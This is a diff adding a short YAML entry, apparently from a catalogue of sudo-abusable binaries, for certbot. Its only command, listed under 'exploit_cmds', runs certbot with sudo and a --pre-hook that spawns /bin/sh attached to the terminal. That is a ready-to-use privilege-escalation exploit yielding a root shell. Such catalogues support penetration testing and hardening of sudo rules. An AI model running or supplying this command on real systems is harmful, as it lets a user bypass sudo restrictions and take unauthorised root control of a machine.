@@ -1,0 +1,5 @@
+name: certbot
+binary_path: /usr/bin/certbot
+exploit_cmds:
+- sudo /usr/bin/certbot certonly -n -d x --standalone --dry-run --agree-tos --email
+  x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
